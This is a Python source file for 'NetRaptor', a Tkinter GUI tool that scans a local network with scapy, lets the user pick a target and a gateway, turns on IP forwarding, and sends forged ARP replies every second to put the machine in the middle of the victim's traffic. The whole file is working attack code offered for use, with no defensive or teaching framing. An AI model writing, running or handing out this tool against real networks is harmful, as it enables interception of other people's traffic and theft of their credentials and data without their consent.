# copyright © Sreeraj, 2024
# https://github.com/s-r-e-e-r-a-j

import os
import tkinter as tk
from tkinter import messagebox
from scapy.layers.l2 import ARP, Ether
from scapy.sendrecv import srp, send
import threading
import time

# Enable IP forwarding (Linux systems)
def enable_ip_forwarding():
    if os.name == 'posix':
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    if os.name == 'posix':
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# Define the main application class
class NetRaptorApp:
    def __init__(self, root):
        self.root = root
        self.root.title("NetRaptor - ARP Poisoning Tool")
        self.root.geometry("500x500")
        
        # Title Label
        tk.Label(root, text="NetRaptor", font=("Helvetica", 18, "bold")).pack(pady=10)
        
        # Copyright Notice
        tk.Label(root, text="This tool is made by Sreeraj", font=("Helvetica", 8)).pack()
        
        # Network Range Input
        tk.Label(root, text="Enter Network Range (e.g., 192.168.1.0/24):").pack(pady=10)
        self.network_entry = tk.Entry(root, width=30)
        self.network_entry.pack()

        # Button to Scan Network
        self.scan_button = tk.Button(root, text="Scan for Hosts", command=self.scan_network)
        self.scan_button.pack(pady=10)

        # Host Selection Dropdown (Target)
        self.selected_host = tk.StringVar()
        self.selected_host.set("Select a host (Target)")
        self.host_dropdown = tk.OptionMenu(root, self.selected_host, "No hosts found")
        self.host_dropdown.pack(pady=5)

        # Gateway Selection Dropdown
        self.selected_gateway = tk.StringVar()
        self.selected_gateway.set("Select a gateway")
        self.gateway_dropdown = tk.OptionMenu(root, self.selected_gateway, "No gateways found")
        self.gateway_dropdown.pack(pady=5)

        # Manual Entry for Gateway IP
        tk.Label(root, text="Or enter Gateway IP manually:").pack()
        self.gateway_entry = tk.Entry(root, width=30)
        self.gateway_entry.pack(pady=5)

        # Attack Button
        self.attack_button = tk.Button(root, text="Start ARP Poisoning", command=self.start_attack)
        self.attack_button.pack(pady=10)

        # Stop Button
        self.stop_button = tk.Button(root, text="Stop ARP Poisoning", state=tk.DISABLED, command=self.stop_attack)
        self.stop_button.pack(pady=10)

        # List to store scanned hosts
        self.hosts = []
        self.attack_thread = None
        self.running = False

    def scan_network(self):
        network_range = self.network_entry.get()
        if not network_range:
            messagebox.showwarning("Input Error", "Please enter a valid network range.")
            return
        
        self.hosts = []
        messagebox.showinfo("Scanning", "Scanning network, please wait...")
        
        # ARP Scan for hosts in the network
        arp = ARP(pdst=network_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp
        result = srp(packet, timeout=3, verbose=0)[0]
        
        # Clear the host and gateway dropdowns and update them with discovered hosts
        self.host_dropdown['menu'].delete(0, 'end')
        self.gateway_dropdown['menu'].delete(0, 'end')
        
        for sent, received in result:
            host = {"ip": received.psrc, "mac": received.hwsrc}
            self.hosts.append(host)
            
            # Add discovered hosts to both dropdowns
            host_label = f"{host['ip']} ({host['mac']})"
            self.host_dropdown['menu'].add_command(label=host_label, 
                                                   command=lambda h=host: self.selected_host.set(f"{h['ip']} ({h['mac']})"))
            self.gateway_dropdown['menu'].add_command(label=host_label, 
                                                      command=lambda h=host: self.selected_gateway.set(f"{h['ip']} ({h['mac']})"))
        
        if not self.hosts:
            messagebox.showinfo("Scan Complete", "No hosts found.")
        else:
            messagebox.showinfo("Scan Complete", f"Found {len(self.hosts)} host(s).")

    def start_attack(self):
        # Enable IP forwarding
        enable_ip_forwarding()
        
        # Target Selection
        target = self.selected_host.get()
        if target == "Select a host (Target)":
            messagebox.showwarning("No Host Selected", "Please select a target host for the attack.")
            return
        
        # Gateway Selection
        gateway = self.selected_gateway.get()
        if gateway == "Select a gateway":
            gateway_ip = self.gateway_entry.get()  # Check manual entry
            if not gateway_ip:
                messagebox.showwarning("No Gateway Selected", "Please select or enter a gateway IP.")
                return
        else:
            gateway_ip, _ = gateway.split(" ")

        # Parse target IP and MAC address
        target_ip, target_mac = target.split(" ")[0], target.split(" ")[1].strip("()")
        
        # Display confirmation message
        messagebox.showinfo("Attack Initiated", f"Starting ARP poisoning on target {target_ip} via gateway {gateway_ip}")
        
        # Disable the attack button and enable stop button
        self.attack_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

        # Run ARP poisoning attack in a separate thread
        self.running = True
        self.attack_thread = threading.Thread(target=self.arp_poison, args=(target_ip, target_mac, gateway_ip))
        self.attack_thread.start()

    def stop_attack(self):
        # Stop the attack and disable IP forwarding
        self.running = False
        disable_ip_forwarding()
        
        if self.attack_thread:
            self.attack_thread.join()  # Wait for the thread to finish
        
        # Re-enable the attack button and disable the stop button
        self.attack_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)
        
        messagebox.showinfo("Attack Stopped", "ARP poisoning attack has been stopped.")

    def arp_poison(self, target_ip, target_mac, gateway_ip):
        try:
            while self.running:
                # Send ARP response to target
                arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
                send(arp_response, verbose=0)
                
                # Send ARP response to gateway
                arp_response = ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
                send(arp_response, verbose=0)
                
                # Send ARP packets every second
                time.sleep(1)
        except Exception as e:
            messagebox.showerror("Error", str(e))

# Main application window
if __name__ == "__main__":
    root = tk.Tk()
    app = NetRaptorApp(root)
    root.mainloop()
